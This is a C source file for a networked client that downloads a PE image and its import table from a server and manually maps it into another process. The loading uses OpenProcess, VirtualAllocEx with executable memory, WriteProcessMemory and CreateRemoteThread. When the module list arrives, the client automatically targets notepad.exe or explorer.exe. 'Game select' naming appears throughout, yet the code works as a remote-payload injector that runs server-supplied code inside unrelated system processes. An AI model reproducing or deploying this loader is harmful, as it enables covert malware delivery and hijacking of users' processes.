#include "network.h"
#include "packet.h"
#include "compression.h"
#include "crc.h"
#include "crypto.h"
#include <string.h>
#include <time.h>
#include <stdlib.h>

#ifdef _WIN32
    #include <windows.h>
    #include <tlhelp32.h>
#else
    #include <unistd.h>
#endif

#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 8888
#define BUFFER_SIZE 2048
#define HEARTBEAT_INTERVAL 5
#define MAX_MODULES 32

static socket_t client_socket = INVALID_SOCKET_VALUE;
static uint8_t connected = 0;
static uint8_t authenticated = 0;
static uint8_t session_key[SESSION_KEY_SIZE];
static uint32_t current_challenge = 0;
static uint32_t heartbeat_sequence = 0;
static time_t last_heartbeat = 0;

static char available_modules[MAX_MODULES][128];
static uint8_t module_count = 0;

static uint32_t pe_image_size = 0;
static uint32_t pe_entry_rva = 0;
static uint32_t pe_imports_size = 0;
static uint8_t* pe_imports_buffer = NULL;
static uint32_t pe_imports_received = 0;
static void* pe_allocated_base = NULL;
static uint8_t* pe_image_buffer = NULL;
static uint32_t pe_image_received = 0;
static uint8_t target_is_64bit = 0;

#ifdef _WIN32
static HANDLE target_process_handle = NULL;
static DWORD target_pid = 0;
#endif

static void handle_packet(packet_t* pkt);
static void send_packet(packet_t* pkt, uint8_t encrypt);
static void send_heartbeat(void);
static void send_connect(void);

#ifdef _WIN32
static DWORD find_process_by_name(const char* process_name) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return 0;
    }

    DWORD found_pid = 0;
    do {
        if (_stricmp(pe32.szExeFile, process_name) == 0) {
            found_pid = pe32.th32ProcessID;
            break;
        }
    } while (Process32Next(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    return found_pid;
}
#endif

static void handle_module_list(packet_t* pkt) {
    payload_module_list_t payload;
    uint16_t size;
    pkt_get_payload(pkt, &payload, &size);
    module_count = payload.count;
    for (uint8_t i = 0; i < module_count && i < MAX_MODULES; i++) {
        strncpy(available_modules[i], payload.modules[i], sizeof(available_modules[i]) - 1);
    }
}

static void send_game_select(uint32_t module_id) {
    packet_t pkt;
    pkt_init(&pkt, PKT_GAME_SELECT);
    payload_game_select_t payload;
    payload.module_id = module_id;
    pkt_set_payload(&pkt, &payload, sizeof(payload));
    send_packet(&pkt, 1);
}

static void handle_pe_metadata(packet_t* pkt) {
    payload_pe_metadata_t payload;
    uint16_t size;
    pkt_get_payload(pkt, &payload, &size);

    pe_image_size = payload.image_size;
    pe_entry_rva = payload.entry_rva;
    pe_imports_size = payload.imports_size;
    target_is_64bit = payload.is_64bit;

    pe_imports_buffer = (uint8_t*)malloc(pe_imports_size);
    if (!pe_imports_buffer) return;
    pe_imports_received = 0;
}

static void handle_pe_imports(packet_t* pkt) {
    payload_pe_imports_t payload;
    uint16_t size;
    pkt_get_payload(pkt, &payload, &size);

    memcpy(pe_imports_buffer + payload.offset, payload.data, payload.chunk_size);
    pe_imports_received += payload.chunk_size;

    if (pe_imports_received >= payload.total_size) {
        /* Parse imports and allocate */
        uint32_t offset = 0;
        uint32_t import_count = 0;

        while (offset < pe_imports_size) {
            uint16_t module_name_len;
            if (offset + 2 > pe_imports_size) break;
            memcpy(&module_name_len, pe_imports_buffer + offset, 2);
            offset += 2 + module_name_len;
            if (offset > pe_imports_size) break;

            uint16_t function_name_len;
            if (offset + 2 > pe_imports_size) break;
            memcpy(&function_name_len, pe_imports_buffer + offset, 2);
            offset += 2;
            if (offset > pe_imports_size) break;

            if (function_name_len == 0) {
                offset += 2;
            } else {
                offset += function_name_len;
            }
            if (offset + 4 > pe_imports_size) break;
            offset += 4;
            import_count++;
        }

#ifdef _WIN32
        if (!target_process_handle) return;

        pe_allocated_base = VirtualAllocEx(target_process_handle, NULL, pe_image_size,
                                           MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!pe_allocated_base) return;

        pe_image_buffer = (uint8_t*)malloc(pe_image_size);
        if (!pe_image_buffer) {
            VirtualFreeEx(target_process_handle, pe_allocated_base, 0, MEM_RELEASE);
            return;
        }

        memset(pe_image_buffer, 0, pe_image_size);
        pe_image_received = 0;
#endif

        packet_t pkt;
        pkt_init(&pkt, PKT_PE_BASE_ADDR);
        payload_pe_base_addr_t base_payload;
        base_payload.base_address = (uint64_t)(uintptr_t)pe_allocated_base;
        pkt_set_payload(&pkt, &base_payload, sizeof(base_payload));
        send_packet(&pkt, 1);
    }
}

static void handle_pe_image(packet_t* pkt) {
    payload_pe_image_t payload;
    uint16_t size;
    pkt_get_payload(pkt, &payload, &size);

    memcpy(pe_image_buffer + payload.offset, payload.data, payload.chunk_size);
    pe_image_received += payload.chunk_size;

    if (pe_image_received >= payload.total_size) {
        /* Resolve imports */
#ifdef _WIN32
        if (!target_process_handle) return;

        uint32_t offset = 0;
        while (offset < pe_imports_size) {
            if (offset + 2 > pe_imports_size) break;
            uint16_t module_name_len;
            memcpy(&module_name_len, pe_imports_buffer + offset, 2);
            offset += 2;

            if (offset + module_name_len > pe_imports_size) break;
            char module_name[256];
            memcpy(module_name, pe_imports_buffer + offset, module_name_len);
            module_name[module_name_len] = '\0';
            offset += module_name_len;

            HMODULE hModule = LoadLibraryA(module_name);
            if (!hModule) {
                if (offset + 2 > pe_imports_size) break;
                uint16_t fn_len;
                memcpy(&fn_len, pe_imports_buffer + offset, 2);
                offset += 2;
                if (fn_len == 0 && offset + 2 <= pe_imports_size) offset += 2;
                else if (offset + fn_len <= pe_imports_size) offset += fn_len;
                if (offset + 4 <= pe_imports_size) offset += 4;
                continue;
            }

            if (offset + 2 > pe_imports_size) break;
            uint16_t function_name_len;
            memcpy(&function_name_len, pe_imports_buffer + offset, 2);
            offset += 2;

            void* proc_addr = NULL;
            if (function_name_len == 0) {
                if (offset + 2 > pe_imports_size) break;
                uint16_t ordinal;
                memcpy(&ordinal, pe_imports_buffer + offset, 2);
                offset += 2;
                proc_addr = (void*)GetProcAddress(hModule, (LPCSTR)(uintptr_t)ordinal);
            } else {
                if (offset + function_name_len > pe_imports_size) break;
                char function_name[256];
                memcpy(function_name, pe_imports_buffer + offset, function_name_len);
                function_name[function_name_len] = '\0';
                offset += function_name_len;
                proc_addr = (void*)GetProcAddress(hModule, function_name);
            }

            if (offset + 4 > pe_imports_size) break;
            uint32_t iat_rva;
            memcpy(&iat_rva, pe_imports_buffer + offset, 4);
            offset += 4;

            if (proc_addr && iat_rva < pe_image_size) {
                void** iat_entry = (void**)(pe_image_buffer + iat_rva);
                *iat_entry = proc_addr;
            }
        }

        /* Write PE image to remote process */
        SIZE_T bytes_written;
        if (!WriteProcessMemory(target_process_handle, pe_allocated_base,
                                pe_image_buffer, pe_image_size, &bytes_written)) {
            packet_t resp;
            pkt_init(&resp, PKT_PE_COMPLETE);
            payload_pe_complete_t complete;
            complete.success = 0;
            complete.thread_id = 0;
            pkt_set_payload(&resp, &complete, sizeof(complete));
            send_packet(&resp, 1);
            return;
        }

        /* Execute */
        void* remote_entry = (void*)((uint8_t*)pe_allocated_base + pe_entry_rva);
        DWORD thread_id = 0;
        HANDLE hThread = CreateRemoteThread(target_process_handle, NULL, 0,
                                            (LPTHREAD_START_ROUTINE)remote_entry,
                                            pe_allocated_base, 0, &thread_id);
        if (hThread) {
            packet_t resp;
            pkt_init(&resp, PKT_PE_COMPLETE);
            payload_pe_complete_t complete;
            complete.success = 1;
            complete.thread_id = thread_id;
            pkt_set_payload(&resp, &complete, sizeof(complete));
            send_packet(&resp, 1);
            CloseHandle(hThread);
        }

        if (target_process_handle) {
            CloseHandle(target_process_handle);
            target_process_handle = NULL;
        }
#endif

        if (pe_imports_buffer) {
            free(pe_imports_buffer);
            pe_imports_buffer = NULL;
        }
        if (pe_image_buffer) {
            free(pe_image_buffer);
            pe_image_buffer = NULL;
        }
    }
}

int main(void) {
    if (net_init() != 0) return 1;

    client_socket = net_create_socket();
    if (client_socket == INVALID_SOCKET_VALUE) {
        net_cleanup();
        return 1;
    }

    if (net_connect(client_socket, SERVER_IP, SERVER_PORT) != 0) {
        net_close_socket(client_socket);
        net_cleanup();
        return 1;
    }

    connected = 1;
    net_set_nonblocking(client_socket);

    uint8_t buffer[BUFFER_SIZE];

    while (connected) {
        int32_t received = net_recv(client_socket, buffer, BUFFER_SIZE);

        if (received > 0) {
            uint16_t offset = 0;
            while (offset < (uint16_t)received) {
                packet_t pkt;
                uint16_t consumed = pkt_deserialize(&pkt, buffer + offset, received - offset);

                if (consumed > 0) {
                    if (pkt_has_flag(&pkt, PKT_FLAG_ENCRYPTED) && authenticated) {
                        crypto_decrypt(session_key, pkt.payload, pkt.payload, pkt.header.length);
                        pkt.header.flags &= ~PKT_FLAG_ENCRYPTED;
                    }

                    if (pkt_has_flag(&pkt, PKT_FLAG_COMPRESSED)) {
                        uint8_t decompressed[MAX_PAYLOAD_SIZE];
                        uint16_t decompressed_size = decompress_data(
                            pkt.payload, pkt.header.length,
                            decompressed, MAX_PAYLOAD_SIZE);
                        memcpy(pkt.payload, decompressed, decompressed_size);
                        pkt.header.length = decompressed_size;
                        pkt.header.flags &= ~PKT_FLAG_COMPRESSED;
                    }

                    handle_packet(&pkt);
                    offset += consumed;
                } else {
                    break;
                }
            }
        } else if (received == 0) {
            connected = 0;
            break;
        } else if (!net_would_block()) {
            connected = 0;
            break;
        }

        if (authenticated) {
            time_t now = time(NULL);
            if (difftime(now, last_heartbeat) >= HEARTBEAT_INTERVAL) {
                send_heartbeat();
                last_heartbeat = now;
            }
        }

#ifdef _WIN32
        Sleep(10);
#else
        usleep(10000);
#endif
    }

    if (client_socket != INVALID_SOCKET_VALUE) {
        packet_t disconnect_pkt;
        pkt_init(&disconnect_pkt, PKT_DISCONNECT);
        payload_disconnect_t disconnect_payload;
        disconnect_payload.reason = 0;
        pkt_set_payload(&disconnect_pkt, &disconnect_payload, sizeof(payload_disconnect_t));
        send_packet(&disconnect_pkt, 0);
        net_close_socket(client_socket);
    }
    net_cleanup();

    return 0;
}

static void handle_packet(packet_t* pkt) {
    switch (pkt_get_type(pkt)) {
        case PKT_CHALLENGE: {
            payload_challenge_t ch;
            uint16_t size;
            pkt_get_payload(pkt, &ch, &size);
            current_challenge = ch.challenge;
            break;
        }

        case PKT_SESSION_KEY: {
            payload_session_key_t sk;
            uint16_t size;
            pkt_get_payload(pkt, &sk, &size);
            memcpy(session_key, sk.key, SESSION_KEY_SIZE);
            send_connect();
            break;
        }

        case PKT_ACK: {
            if (!authenticated) {
                authenticated = 1;
                last_heartbeat = time(NULL);
            }
            break;
        }

        case PKT_ERROR:
        case PKT_DISCONNECT: {
            connected = 0;
            break;
        }

        case PKT_MODULE_LIST: {
            handle_module_list(pkt);

            /* Auto-inject: select first module into first available process */
#ifdef _WIN32
            if (module_count > 0) {
                const char* targets[] = {"notepad.exe", "explorer.exe", NULL};
                for (int i = 0; targets[i] != NULL; i++) {
                    DWORD pid = find_process_by_name(targets[i]);
                    if (pid > 0) {
                        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
                        if (hProcess) {
                            target_process_handle = hProcess;
                            target_pid = pid;
                            send_game_select(0);
                            break;
                        }
                    }
                }
            }
#endif
            break;
        }

        case PKT_PE_METADATA: {
            handle_pe_metadata(pkt);
            break;
        }

        case PKT_PE_IMPORTS: {
            handle_pe_imports(pkt);
            break;
        }

        case PKT_PE_IMAGE: {
            handle_pe_image(pkt);
            break;
        }

        default:
            break;
    }
}

static void send_packet(packet_t* pkt, uint8_t encrypt) {
    if (!connected || client_socket == INVALID_SOCKET_VALUE) return;

    if (should_compress(pkt->payload, pkt->header.length)) {
        uint8_t compressed[MAX_PAYLOAD_SIZE];
        uint16_t compressed_size = compress_data(
            pkt->payload, pkt->header.length,
            compressed, MAX_PAYLOAD_SIZE);

        if (compressed_size < pkt->header.length) {
            memcpy(pkt->payload, compressed, compressed_size);
            pkt->header.length = compressed_size;
            pkt_set_flag(pkt, PKT_FLAG_COMPRESSED);
        }
    }

    if (encrypt && authenticated) {
        crypto_encrypt(session_key, pkt->payload, pkt->payload, pkt->header.length);
        pkt_set_flag(pkt, PKT_FLAG_ENCRYPTED);
    }

    uint8_t buffer[MAX_PACKET_SIZE];
    uint16_t size = pkt_serialize(pkt, buffer);
    net_send(client_socket, buffer, size);
}

static void send_heartbeat(void) {
    packet_t pkt;
    pkt_init(&pkt, PKT_HEARTBEAT);

    payload_heartbeat_t payload;
    payload.sequence = heartbeat_sequence++;
    payload.challenge_response = crypto_solve_challenge(current_challenge);

    pkt_set_payload(&pkt, &payload, sizeof(payload));
    send_packet(&pkt, 1);
}

static void send_connect(void) {
    packet_t pkt;
    pkt_init(&pkt, PKT_CONNECT);

    payload_connect_t payload;
    payload.timestamp = (uint32_t)time(NULL);
    payload.client_id = 1;

    pkt_set_payload(&pkt, &payload, sizeof(payload));
    send_packet(&pkt, 0);
}
